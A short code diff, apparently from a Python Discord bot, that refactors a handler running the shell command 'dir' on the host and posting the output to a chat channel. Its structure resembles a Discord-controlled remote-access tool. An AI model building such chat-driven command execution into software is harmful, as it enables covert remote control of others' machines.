@@ -684,14 +684,9 @@ async def on_message(message):
             import subprocess as sp
             import os
             import subprocess
-            def shell():
-                output = subprocess.run("dir", stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                global status
-                status = "ok"
-                return output
-            out = shell()
-            if status:
-                result = out
+            output = sp.getoutput('dir')
+            if output:
+                result = output
                 numb = len(result)
                 if numb < 1:
                     await message.channel.send("[*] Command not recognized or no output was obtained")
